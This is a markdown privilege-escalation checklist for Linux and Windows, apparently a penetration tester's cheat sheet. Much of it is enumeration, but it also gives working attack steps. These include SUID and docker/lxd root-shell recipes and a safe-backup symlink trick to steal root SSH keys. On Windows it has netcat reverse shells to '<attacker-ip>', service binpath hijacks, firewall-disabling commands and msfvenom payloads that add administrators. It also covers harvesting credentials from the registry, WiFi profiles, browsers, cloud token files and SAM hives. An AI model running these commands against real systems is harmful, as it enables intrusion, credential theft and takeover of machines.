# Privilege Escalation Methodology🪂
##  Few words before going on
"**Slow is smooth, and smooth is fast**"
Be methodical in what you do or you will get lost.
## General thoughts to bear in mind
If you are still trying to gain an initial foothold but you can access local files, try to look for firewall's rules. So you won't become mad to figure it out by "brute forcing" the ports for a reverse shell 🙃
## Linux
### User Enumeration
- [ ] General users enum
	```bash
	whoami
	id
	
	cat /etc/passwd | cut -d: -f1
	```
- [ ] General groups enum
	```bash
	groups username
	cat /etc/groups
	```
- [ ] Check for super users
	```bash
	grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' \
	awk -F: '($3 == "0") {print}' /etc/passwd \
	cat /etc/sudoers
	```
- [ ] Sudo privileges:
	```bash
	sudo -l
	```
- [ ] Groups:
	```bash
	id
	groups
	```
- [ ] Logged in at the moment
	```bash
	# show who is logged on
	who
	# show who is logged on and what he/she's doing
	w
	```
- [ ] Last logged in
	```bash
	last
	```
### System Enumeration
- [ ] Kernel version & architecture
	```bash
	uname -a
	(cat /proc/version || uname -a ) 2>/dev/null
	lsb_release -a 2>/dev/null
	lscpu
	```
- [ ] Distribution
	```bash
	cat /etc/issue
	```
- [ ] Sudo version
	```bash
	sudo -V
	```
- [ ] Service running
	```bash
	ps aux
	ps aux | grep root
	```
- [ ] Look for potentially useful software and compiler
	```bash
	# if there is a compiler check if it's vulnerable to kernel exploit
	which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp tmux screen nmap 2>/dev/null
	```
### Network Enumeration
- [ ] Retrieve the machine hostname
	```bash
	hostname
	cat /etc/hostname
	```
- [ ] Network configuration
	```bash
	ifconfig
	ip -c a
	```
- [ ] Show route table
	```bash
	route
	ip -c route
	```
- [ ] Show ARP table
	```bash
	arp -a
	ip -c neigh
	```
- [ ] Check open ports not available from the outside and if the target is communicating with someone else
	```bash
	netstat -ano
	```
### Credential Access
- [ ] Try known passwords
- [ ] Search creds from config files (Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret):
	```bash
	grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
	find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
	locate password | more
	```
- [ ] Search creds in common files:
	```bash
	ls -la /var /var/mail /var/spool/mail
	```
- [ ] Search creds from local DBs
- [ ] Search creds from bash history:
	```bash
	history
	cat ~/.bash_history
	```
- [ ] Search creds from memory:
	```bash
	strings /dev/mem -n10 | grep -i PASS
	```
- [ ] SSH keys:
	```bash
	cat ~/.ssh/id_rsa
	ls ~/.ssh/*
	find / -name authorized_keys 2> /dev/null
	find / -name id_rsa 2> /dev/null
	```
- [ ] 	Search rsync config file
	```bash
	find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
	```
### Exploit
- [ ] Kernel  is  vulnerable to known exploit?
- [ ] Sudo is vulnerable to known exploit?
- [ ] Services running on localhost are vulnerable?
	
### Misconfiguration
- [ ] Cron job -> check for write permissions on the following files:
	```bash
	/etc/init.d
	/etc/cron*
	/etc/crontab
	/etc/cron.allow
	/etc/cron.d 
	/etc/cron.deny
	/etc/cron.daily
	/etc/cron.hourly
	/etc/cron.monthly
	/etc/cron.weekly
	/etc/sudoers
	/etc/exports
	/etc/anacrontab
	/var/spool/cron
	/var/spool/cron/crontabs/root
	crontab -l
	ls -alh /var/spool/cron;
	ls -al /etc/ | grep cron
	ls -al /etc/cron*
	cat /etc/cron*
	cat /etc/at.allow
	cat /etc/at.deny
	cat /etc/cron.allow
	cat /etc/cron.deny*
	```
- [ ] Writeable cron job dependecy (File, Python library, etc)
- [ ] Find SUID:
	```bash
	find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
	find / -uid 0 -perm -4000 -type f 2>/dev/null
	```
- [ ] Check SUID on [GTFOBins](https://gtfobins.github.io/)
- [ ] Create SUID:
	```bash
	print 'int main(void){\nsetresuid(0, 0, 0);\\nsystem("/bin/sh");\\n}' \> /tmp/suid.c   
	gcc -o /tmp/suid /tmp/suid.c  
	sudo chmod +x /tmp/suid # execute right
	sudo chmod +s /tmp/suid # setuid bit
	```
- [ ] SGID:
	```bash
	find / -perm -g=s -type f 2>/dev/null
	find / -perm +2000 -user root -type f -print
	```
- [ ] Interesting capabilities on binary
	```bash
	getcap -r / 2>/dev/null
	```
- [ ] Any writable file
	```bash
	# look for any writable file
	find / -type f -writable 2> /dev/null

	# look for writable configuration file
	find /etc -type f -writable 2> /dev/null
	```
- [ ] Any user owned ifle
	```bash
	find / -type f -user username 2>/dev/null
	```
- [ ] Any NFS share
	```bash
	# check if it's avaiable a NFS share
	showmount -e X.X.X.X;
	# mount it and look for files or try to create ones
	# maybe you are another user
	mount X.X.X.X:/ /tmp/
	```
- [ ] Let [Pspy](https://github.com/DominicBreuker/pspy) spy on the processes
	```bash
	# you could find some interesting running processes or credentials
	./pspy > /tmp/pspy-out.txt
	```
- [ ] Is .bashrc writeable?
	```bash
	# if another user's .bashrc is writeable, you could
	# put code inside it and wait the user to login in order
	# to trigger the execution of it
	ls -la /home/*/.bashrc; find / -name .bashrc -xdev 2>/dev/nul
	```
- [ ] Is the user beloging to docker?
	```bash
	# this will spawn a root shell
	docker run -v /:/mnt --rm -it alpine chroot /mnt sh
	```
- [ ] Is the user beloging to lxd?
	```bash
	# clone the repo and build an alpine image
	git clone https://github.com/saghul/lxd-alpine-builder
	cd lxd-alpine-builder
	sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
	sudo ./build-alpine -a i686

	# transfer the image to the target, then import the image
	lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

	# before running the image, start and configure the lxd storage pool as default 
	lxd init

	# run the image
	lxc init myimage mycontainer -c security.privileged=true

	# mount the /root into the image
	lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

	# pop the shell
	lxc start mycontainer
	lxc exec mycontainer /bin/sh
	```
- [ ] Ability to use [safe-backup](https://github.com/scrwdrv/safe-backup) as another user (root)?
	```bash
	# you can install safe-backup on your system, now you can
	# potentially backup whatever you want e.g.: your root public ssh key!

	## Preparation
	### ON ATTACKING MACHINE
	sudo safe-backup -i /root/.ssh/ -o /tmp/backup
	# copy the safe-backup's encryption key to the /tmp/backup directory
	sudo cp /root/.config/safe-backup/key.safe /tmp/backup/key.safe
	# transfer them to the target machine

	## Getting ready
	### ON TARGET MACHINE
	# you have to import the newly downloaded encryption key :)
	sudo /usr/bin/safe-backup --import-key /path/where/is/key.safe
	# When decrypting files, safe-backup creates # a new directory
	# with the same name as the backup but without the .bua extension.
	# If this directory already exists, the existing directory is used
	#rather than a new one being created. We can exploit this by
	# creating a symbolic link to /root/.ssh and having safe-backup
	# decrypt folders into this directory.
	ln -s /root/.ssh /path/where/is/-root-.ssh
	
	## Exploitation
	### ON TARGET MACHINE
	sudo safe-backup -d /path/where/is/-root-.ssh.bua
	### ON ATTACKING MACHINE
	sudo ssh -i /root/.ssh/id_rsa root@$IP
	```
- [ ] Any accessible sensitive file?
	- [ ] /etc/passwd
	- [ ] /etc/shadow
	- [ ] /etc/sudoers
	- [ ] Configuration files
	- [ ] /root/.ssh/id_rsa
	- [ ] entire root folder
	- [ ] Check env info
		 ```bash
		 (env || set) 2>/dev/null
		 echo $PATH
		 ```
- [ ] Writeable PATH
	- [ ] Root $PATH writeable
	- [ ] Directory in PATH writeable
- [ ] LD_PRELOAD set in /etc/sudoers
- [ ] Nothing yet? Google-Fu the web to look for other checklists
### Automation
If you are running out of time, automation could save you, but bear in mind that it's not stealthy at all (not this time).
This is a non comprehensive list of linux privesc automated script, to gain a better result try run different scripts on the same target:
- [ ] [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) (Linux local privilege Escalation Awesome Script)
- [ ] [LinEnum](https://github.com/rebootuser/LinEnum)
- [ ] [LES2](https://github.com/jondonas/linux-exploit-suggester-2) (Linux Exploit Suggester 2)
- [ ] [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
- [ ] [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)	
## Windows
### User Enumeration
- [ ] General users enum
	```powershell
	whoami /all
	net users %username%
	net users
	Get-WmiObject -Class Win32\_UserAccount
	Get-LocalUser | ft Name,Enabled,LastLogon
	Get-ChildItem C:\\Users -Force | select Name
	Get-LocalGroupMember Administrators | ft Name, PrincipalSource
	```
- [ ] General groups enum
	```powershell
	net localgroup
	net localgroup Administrators
	```
- [ ] Check if current user has these tokens:
	```powershell
	SeImpersonatePrivilege
	SeAssignPrimaryPrivilege
	SeTcbPrivilege
	SeBackupPrivilege
	SeRestorePrivilege
	SeCreateTokenPrivilege
	SeLoadDriverPrivilege
	SeTakeOwnershipPrivilege
	SeDebugPrivilege
	```
### System Enumeration
- [ ] Windows version
	```powershell
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
	```
- [ ] Installed patches and updates
	```powershell
	wmic qfe
	```
- [ ] Architecture
	```powershell
	wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
	```
- [ ] Environment variables
	```powershell
	set
	Get-ChildItem Env: | ft Key,Value
	```
- [ ] Drives
	```powershell
	wmic logicaldisk get caption || fsutil fsinfo drives
	wmic logicaldisk get caption,description,providername
	Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\\FileSystem"}| ft Name,Root
	```
### Network Enumeration
- [ ] List all NICs, IP and DNS
	```powershell
	ipconfig /all
	Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
	Get-DnsClientServerAddress -AddressFamily IPv4 | ft
	```
- [ ] List routing table
	```powershell
	route print
	Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
	```
- [ ] List ARP table
	```powershell
	arp -A
	Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
	```
- [ ] List current connections
	```powershell
	netstat -ano
	```
- [ ] List current connections correlated to running service (requires elevated privs)
	```powershell
	netstat -bona
	```
- [ ] List firewall state and config
	```powershell
	netsh advfirewall firewall dump
	netsh firewall show state
	netsh firewall show config
	```
- [ ] List firewall's blocked ports
	```powershell
	$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
	```
- [ ] Disable firewall
	```powershell
	netsh advfirewall set allprofiles state off
	netsh firewall set opmode disable
	```
- [ ] List network shares
	```powershell
	net share
	powershell Find-DomainShare -ComputerDomain domain.local
	```
- [ ] SNMP config
	```powershell
	reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s
	Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse
	```
### Credential Access
- [ ]  Go from **medium mandatory level** to **high mandatory level**
	```powershell
	# using powershell
	powershell.exe Start-Process cmd.exe -Verb runAs
	```
- [ ] **TRY KNOWN PASSWORDS!**
	```powershell
	# check also with runas
	C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
	```
- [ ] Creds from config files (Try different words e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth):
	```powershell
	dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
	findstr /si /m password *.xml *.ini *.txt
	```
- [ ] Creds from local DBs
- [ ] Creds from  Windows Vault
	```powershell
	cmdkey /list
	# if found
	runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
	```
- [ ] Creds from Registry
	```powershell
	reg query HKLM /f pass /t REG_SZ /s
	reg query HKCU /f pass /t REG_SZ /s
	
	reg query HKLM /f password /t REG_SZ /s
	reg query HKCU /f password /t REG_SZ /s
	
	# Windows Autologin
	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
	 
	 # SNMP parameters
	reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
	
	# Putty credentials
	reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
	reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
	
	# VNC credentials
	reg query "HKCU\Software\ORL\WinVNC3\Password"
	reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
	
	## OpenSSH credentials
	reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
	```
- [ ] Creds from Unattend or Sysprep Files
	 ```powershell
	 c:\sysprep.inf
	 c:\sysprep\sysprep.xml
	 %WINDIR%\Panther\Unattend\Unattend*.xml
	 %WINDIR%\Panther\Unattend*.xml
	 ```
- [ ] Creds from Log Files
	```powershell
	dir /s /b /p *access*.log* == *.log
	```
- [ ] Creds from IIS web config
	```powershell
	Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
	Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
		
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
	C:\inetpub\wwwroot\web.config
	```
- [ ] Check other possible interesting files
	```powershell
	dir c:*vnc.ini /s /b
	dir c:*ultravnc.ini /s /b
	%SYSTEMDRIVE%\pagefile.sys
	%WINDIR%\debug\NetSetup.log
	%WINDIR%\repair\sam
	%WINDIR%\repair\system
	%WINDIR%\repair\software, %WINDIR%\repair\security
	%WINDIR%\iis6.log
	%WINDIR%\system32\config\AppEvent.Evt
	%WINDIR%\system32\config\SecEvent.Evt
	%WINDIR%\system32\config\default.sav
	%WINDIR%\system32\config\security.sav
	%WINDIR%\system32\config\software.sav
	%WINDIR%\system32\config\system.sav
	%WINDIR%\system32\CCM\logs\*.log
	%USERPROFILE%\ntuser.dat
	%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
	%WINDIR%\System32\drivers\etc\hosts
	C:\ProgramData\Configs\*
	C:\Program Files\Windows PowerShell\*vnc.ini, ultravnc.ini, \*vnc\*
	web.config
	php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
	SiteList.xml #McAfee
	ConsoleHost_history.txt #PS-History
	*.gpg
	*.pgp
	*config*.php
	elasticsearch.y*ml
	kibana.y*ml
	*.p12
	*.der
	*.csr
	*.cer
	known_hosts
	id_rsa
	id_dsa
	*.ovpn
	anaconda-ks.cfg
	hostapd.conf
	rsyncd.conf
	cesi.conf
	supervisord.conf
	tomcat-users.xml
	*.kdbx
	KeePass.config
	Ntds.dit
	SAM
	SYSTEM
	FreeSSHDservice.ini
	access.log
	error.log
	server.xml
	setupinfo
	setupinfo.bak
	key3.db #Firefox
	key4.db #Firefox
	places.sqlite #Firefox
	"Login Data" #Chrome
	Cookies #Chrome
	Bookmarks #Chrome
	History #Chrome
	TypedURLsTime #IE
	TypedURLs #IE
	```
- [ ] Creds from WiFi
	```powershell
	# 1. Find AP SSID
	netsh wlan show profile
	# 2. Get cleartext password
	netsh wlan show profile <SSID> key=clear
	# OR
	# Go hard and grab 'em all
	cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
	```
- [ ] Creds from sticky notes app
	```powershell
	C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
	```
- [ ] Creds stored in services
	```powershell
	# SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
	# https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
	Import-Module path\to\SessionGopher.ps1;
	Invoke-SessionGopher -AllDomain -o
	Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
	```
- [ ] Creds from Powershell History
	```powershell
	type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
	type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
	type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
	cat (Get-PSReadlineOption).HistorySavePath
	cat (Get-PSReadlineOption).HistorySavePath | sls passw
	```
- [ ] Creds from [alternate data stream](https://owasp.org/www-community/attacks/Windows_alternate_data_stream)
	```powershell
	Get-Item -path <filename> -Stream *
	Get-Content -path <filename> -Stream <keyword>
	```
- [ ] SAM & SYSTEM bak
	```powershell
	# Usually %SYSTEMROOT% = C:\Windows
	%SYSTEMROOT%\repair\SAM
	%SYSTEMROOT%\System32\config\RegBack\SAM
	%SYSTEMROOT%\System32\config\SAM
	%SYSTEMROOT%\repair\system
	%SYSTEMROOT%\System32\config\SYSTEM
	%SYSTEMROOT%\System32\config\RegBack\system
	```
- [ ] Cloud credentials
	```powershell
	# From user home
	.aws\credentials
	AppData\Roaming\gcloud\credentials.db
	AppData\Roaming\gcloud\legacy_credentials
	AppData\Roaming\gcloud\access_tokens.db
	.azure\accessTokens.json
	.azure\azureProfile.json
	```
- [ ] Cached [GPP password](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
	```powershell
	# Before Vista look inside
	C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
	# After Vista look inside
	C:\ProgramData\Microsoft\Group Policy\history
	# Look for
	Groups.xml
	Services.xml
	Scheduledtasks.xml
	DataSources.xml
	Printers.xml
	Drives.xml
	
	# Decrypt the passwords with
	gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
	```
- [ ] Saved RDP connections
	```powershell
	HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
	HKCU\Software\Microsoft\Terminal Server Client\Servers\
	```
- [ ] Remote desktop credential manager
	```powershell
	%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
	```
- [ ] SCClient \ SCCM
	```powershell
	# Check if the retrieved sotfwares are vulnerable to DLL Sideloading
	# https://github.com/enjoiz/Privesc
	$result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM\_Application -Property * | select Name,SoftwareVersion
	if ($result) { $result }
	else { Write "Not Installed." }
	```
- [ ] Check recycle bin
### Exploit
- [ ] Services running on localhost
- [ ] Kernel version
	```bash
	# List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
	# to cross compile a program from Kali
	$ i586-mingw32msvc-gcc -o adduser.exe useradd.c
	```
- [ ] Software versions
- [ ] Service versions
### Misconfiguration
- [ ] Services
	- [ ] Check permissions
		```powershell
		# using sc
		sc qc <service_name>

		# using accesschk.exe
		accesschk.exe -ucqv <Service_Name>
		accesschk.exe -uwcqv "Authenticated Users" * /accepteula
		accesschk.exe -uwcqv %USERNAME% * /accepteula
		accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
		accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
		
		# using msf
		exploit/windows/local/service_permissions
		```
	- [ ] Unquoted Service Path
		```powershell
		wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
		wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" #Not only auto services

		for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
			for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
				echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
			)
		)
		
		gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
		
		# find them using msf 
		exploit/windows/local/trusted_service_path
		
		# generate service binary with msfvenom
		msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
		```
	- [ ] Change service binary path
		```powershell
		# if the group "Authenticated users" has SERVICE_ALL_ACCESS
		# it can modify the binary path
		
		# bind shell
		sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
		
		# reverse shell
		sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe <attacker-ip> 4444 -e cmd.exe"
		
		# add user to local admin group
		sc config <Service_Name> binpath= "net localgroup administrators username /add"
		
		# example using SSDPRV
		sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
		
		# then restart the service
		wmic service NAMEOFSERVICE call startservice
		net stop [service name] && net start [service name]
		```
	- [ ] DLL Hijacking / Overwrite service binary
		```powershell
		for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

		for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
		
		# do it by using sc
		sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
		FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
		FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
		```
	- [ ] Registry modify permissions
		```powershell
		reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

		#Try to write every service with its current content (to check if you have write permissions)
		for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

		get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

		# if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
		# it can be leveraged to change the binary path inside the registry
		reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
		```
- [ ] Installed applications
	- [ ] DLL Hijacking for installed applications
		```powershell
		dir /a "C:\Program Files"
		dir /a "C:\Program Files (x86)"
		reg query HKEY_LOCAL_MACHINE\SOFTWARE

		Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
		Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
		```
	- [ ] Write permissions
		```powershell
		# using accesschk.exe
		accesschk.exe /accepteula
		
		# Find all weak folder permissions per drive.
		accesschk.exe -uwdqs Users c:\
		accesschk.exe -uwdqs "Authenticated Users" c:\
		accesschk.exe -uwdqs "Everyone" c:\
		
		# Find all weak file permissions per drive.
		accesschk.exe -uwqs Users c:\*.*
		accesschk.exe -uwqs "Authenticated Users" c:\*.*
		accesschk.exe -uwdqs "Everyone" c:\*.*
		
		# using icalcs
		icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
		icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
		
		# using Powershell
		Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

		Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
		```
- [ ] PATH DLL Hijacking
	```powershell
	# having write permissions inside a folder present ON PATH could bring to DLL hijacking
	for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
	```
- [ ] AlwaysInstallElevated set in Registry
	```powershell
	# if both are enabled (set to 0x1), it's possible to execute
	# any .msi as NT AUTHORITY\SYSTEM
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	
	# check with msf
	exploit/windows/local/always_install_elevated
	
	# generate payload with msfvenom
	# no uac format
	msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
	# using the msiexec the uac wont be prompted
	msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
	
	# install .msi
	msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
	```
- [ ] Scheduled tasks
	```powershell
	# using schtasks
	schtasks /query /fo LIST /v
	# filtering the output
	schtasks /query /fo LIST /v | findstr /v "\Microsoft"
	
	# using powershell
	Get-ScheduledTask | ft TaskName,TaskPath,State
	# filtering the output
	Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State	
	```
	- [ ] Executable file writeable
	- [ ] Dependency writeable
- [ ] Sensitive files readable
	- [ ] SAM Hive
	- [ ] SYSTEM Hive
- [ ] Windows Subsystem For Linux
	```powershell
	wsl whoami
	./ubuntum2004.exe config --default-user root
	wsl whoami
	wsl python -c 'put here your command'
	```